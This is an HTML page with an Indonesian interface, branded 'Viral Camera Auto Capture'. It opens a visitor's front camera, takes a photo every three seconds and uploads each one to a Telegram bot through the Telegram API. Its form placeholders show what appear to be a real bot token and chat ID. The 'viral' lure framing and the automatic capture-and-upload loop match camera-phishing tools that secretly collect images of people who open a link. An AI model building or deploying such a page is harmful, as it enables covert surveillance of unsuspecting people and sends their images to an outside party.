<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Viral Camera Capture</title>
    <style>
        :root {
            --neon-pink: #ff2a6d;
            --neon-blue: #0ff0fc;
            --dark-bg: #0a0a12;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background-color: var(--dark-bg);
            color: white;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: rgba(22, 22, 34, 0.8);
            border-radius: 15px;
            box-shadow: 0 0 20px var(--neon-pink);
            border: 2px solid var(--neon-blue);
        }
        
        h1 {
            color: var(--neon-blue);
            text-shadow: 0 0 10px var(--neon-blue);
            margin-bottom: 30px;
        }
        
        .camera-container {
            position: relative;
            width: 100%;
            max-width: 640px;
            margin: 0 auto 20px;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 0 15px var(--neon-pink);
        }
        
        #video {
            width: 100%;
            display: block;
            transform: scaleX(-1); /* Mirror effect */
        }
        
        #canvas {
            display: none;
        }
        
        .controls {
            margin: 20px 0;
        }
        
        button {
            background: linear-gradient(45deg, var(--neon-pink), var(--neon-blue));
            border: none;
            color: white;
            padding: 12px 25px;
            font-size: 16px;
            border-radius: 50px;
            cursor: pointer;
            margin: 10px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0, 247, 255, 0.4);
        }
        
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(255, 42, 109, 0.6);
        }
        
        button:disabled {
            background: #666;
            cursor: not-allowed;
        }
        
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.1);
        }
        
        .gallery {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        }
        
        .gallery img {
            width: 100px;
            height: 100px;
            object-fit: cover;
            border-radius: 5px;
            border: 2px solid var(--neon-blue);
            transition: transform 0.3s;
        }
        
        .gallery img:hover {
            transform: scale(1.1);
            box-shadow: 0 0 10px var(--neon-pink);
        }
        
        .viral-sticker {
            position: absolute;
            width: 100px;
            right: 20px;
            top: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .telegram-info {
            background: rgba(0, 136, 204, 0.2);
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            border-left: 4px solid #0088cc;
        }
        
        input {
            padding: 10px;
            border-radius: 5px;
            border: 1px solid var(--neon-blue);
            background: rgba(255, 255, 255, 0.1);
            color: white;
            margin: 10px 0;
            width: 80%;
            max-width: 400px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://i.ibb.co/0jQ7Z0T/viral.png" alt="VIRAL" class="viral-sticker">
        <h1>VIRAL CAMERA AUTO CAPTURE</h1>
        
        <div class="telegram-info">
            <h3>Telegram Bot Settings</h3>
            <input type="text" id="botToken" placeholder="8299240007:AAHN7OTPC4cjG17_66bmOhl-oBwbAthyk0c">
            <input type="text" id="chatId" placeholder="7548339932">
            <p>Dapatkan Bot Token dari @BotFather dan Chat ID dari @userinfobot di Telegram</p>
        </div>
        
        <div class="camera-container">
            <video id="video" autoplay playsinline></video>
            <canvas id="canvas"></canvas>
        </div>
        
        <div class="controls">
            <button id="startBtn">Start Auto Capture</button>
            <button id="stopBtn" disabled>Stop Capture</button>
            <button id="testBtn">Test Send to Telegram</button>
        </div>
        
        <div class="status" id="status">
            Status: Menunggu untuk memulai...
        </div>
        
        <div class="gallery" id="gallery">
            <!-- Captured images will appear here -->
        </div>
    </div>

    <script>
        // DOM Elements
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const testBtn = document.getElementById('testBtn');
        const statusDiv = document.getElementById('status');
        const galleryDiv = document.getElementById('gallery');
        const botTokenInput = document.getElementById('botToken');
        const chatIdInput = document.getElementById('chatId');
        
        // Variables
        let stream = null;
        let captureInterval = null;
        const capturedImages = [];
        
        // Start camera and auto capture
        startBtn.addEventListener('click', async () => {
            try {
                statusDiv.textContent = "Status: Mengakses kamera...";
                
                // Get camera access
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 640, 
                        height: 480,
                        facingMode: 'user' // Front camera
                    }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                
                // Enable/disable buttons
                startBtn.disabled = true;
                stopBtn.disabled = false;
                
                statusDiv.textContent = "Status: Kamera aktif - Auto capture dimulai (setiap 3 detik)";
                
                // Start auto capture every 3 seconds
                captureInterval = setInterval(captureAndSend, 3000);
                
                // Capture immediately
                setTimeout(captureAndSend, 1000);
                
            } catch (err) {
                statusDiv.textContent = "Error: " + err.message;
                console.error("Camera error:", err);
            }
        });
        
        // Stop capture
        stopBtn.addEventListener('click', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            
            startBtn.disabled = false;
            stopBtn.disabled = true;
            
            statusDiv.textContent = "Status: Capture dihentikan";
        });
        
        // Test send to Telegram
        testBtn.addEventListener('click', async () => {
            if (!botTokenInput.value || !chatIdInput.value) {
                statusDiv.textContent = "Error: Masukkan Bot Token dan Chat ID terlebih dahulu";
                return;
            }
            
            statusDiv.textContent = "Status: Mengirim test capture ke Telegram...";
            
            try {
                // Create a test image
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convert to blob
                canvas.toBlob(async (blob) => {
                    const success = await sendToTelegram(blob, "Test Capture dari Viral Camera");
                    if (success) {
                        statusDiv.textContent = "Status: Test capture berhasil dikirim ke Telegram!";
                    } else {
                        statusDiv.textContent = "Error: Gagal mengirim test capture";
                    }
                }, 'image/jpeg', 0.8);
                
            } catch (err) {
                statusDiv.textContent = "Error: " + err.message;
                console.error("Test capture error:", err);
            }
        });
        
        // Capture and send function
        async function captureAndSend() {
            if (!stream) return;
            
            try {
                // Set canvas size
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Draw video frame to canvas
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Get current timestamp
                const timestamp = new Date().toLocaleString();
                
                // Convert to blob
                canvas.toBlob(async (blob) => {
                    // Add to gallery
                    const imageUrl = URL.createObjectURL(blob);
                    addToGallery(imageUrl, timestamp);
                    
                    // Send to Telegram if credentials are set
                    if (botTokenInput.value && chatIdInput.value) {
                        statusDiv.textContent = "Status: Mengirim capture ke Telegram...";
                        const success = await sendToTelegram(blob, `Auto Capture - ${timestamp}`);
                        
                        if (success) {
                            statusDiv.textContent = `Status: Capture terkirim ke Telegram pada ${timestamp}`;
                        } else {
                            statusDiv.textContent = "Error: Gagal mengirim ke Telegram";
                        }
                    } else {
                        statusDiv.textContent = `Status: Capture diambil pada ${timestamp} (Telegram tidak dikonfigurasi)`;
                    }
                }, 'image/jpeg', 0.8);
                
            } catch (err) {
                statusDiv.textContent = "Error saat capture: " + err.message;
                console.error("Capture error:", err);
            }
        }
        
        // Send image to Telegram
        async function sendToTelegram(blob, caption) {
            try {
                const formData = new FormData();
                formData.append('chat_id', chatIdInput.value);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', caption);
                
                const response = await fetch(
                    `https://api.telegram.org/bot${botTokenInput.value}/sendPhoto`,
                    {
                        method: 'POST',
                        body: formData
                    }
                );
                
                const data = await response.json();
                return data.ok;
            } catch (err) {
                console.error("Telegram send error:", err);
                return false;
            }
        }
        
        // Add captured image to gallery
        function addToGallery(imageUrl, timestamp) {
            const img = document.createElement('img');
            img.src = imageUrl;
            img.title = timestamp;
            
            const container = document.createElement('div');
            container.style.position = 'relative';
            
            const timeLabel = document.createElement('div');
            timeLabel.textContent = timestamp;
            timeLabel.style.position = 'absolute';
            timeLabel.style.bottom = '0';
            timeLabel.style.background = 'rgba(0,0,0,0.7)';
            timeLabel.style.width = '100%';
            timeLabel.style.fontSize = '10px';
            timeLabel.style.padding = '2px';
            
            container.appendChild(img);
            container.appendChild(timeLabel);
            
            galleryDiv.insertBefore(container, galleryDiv.firstChild);
            
            // Keep only last 12 images
            if (galleryDiv.children.length > 12) {
                galleryDiv.removeChild(galleryDiv.lastChild);
            }
        }
        
        // Load saved Telegram settings from localStorage
        function loadSettings() {
            const savedToken = localStorage.getItem('telegram_bot_token');
            const savedChatId = localStorage.getItem('telegram_chat_id');
            
            if (savedToken) botTokenInput.value = savedToken;
            if (savedChatId) chatIdInput.value = savedChatId;
        }
        
        // Save Telegram settings to localStorage
        function saveSettings() {
            localStorage.setItem('telegram_bot_token', botTokenInput.value);
            localStorage.setItem('telegram_chat_id', chatIdInput.value);
        }
        
        // Save settings when inputs change
        botTokenInput.addEventListener('change', saveSettings);
        chatIdInput.addEventListener('change', saveSettings);
        
        // Initialize
        loadSettings();
        statusDiv.textContent = "Status: Klik 'Start Auto Capture' untuk memulai";
    </script>
</body>
</html>
